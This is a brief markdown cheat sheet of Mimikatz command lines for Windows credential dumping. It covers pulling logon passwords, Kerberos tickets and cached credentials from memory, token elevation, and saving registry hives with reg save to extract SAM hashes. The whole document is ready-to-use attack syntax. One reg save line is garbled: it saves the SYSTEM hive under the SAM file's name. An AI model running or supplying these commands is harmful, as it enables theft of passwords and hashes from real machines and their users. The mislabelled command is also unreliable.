# Mimikatz syntax

1. mimkatz 1 liner:
   - `Mimikatz.exe "log mimikatz.log" "sekurlsa::logonpasswords" "sekurlsa::tickets" "lsadump::cache" exit`
  
2. mimikatz SAM and SYSTEM files:
   - `Mimikatz.exe "log mimikatz.log" "lsadump::sam /system:<system file> /sam:<sam file>" exit`

3. Combined:
   - `.\mimikatz.exe "log mimikatz.log" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets" "lsadump::cache" "lsadump::sam /system:systembakup.hiv /sam:sambakup.hiv" exit`
   - `reg save HKLM\SYSTEM sambakup.hiv`
   - `reg save HKLM\SYSTEM systembakup.hiv`
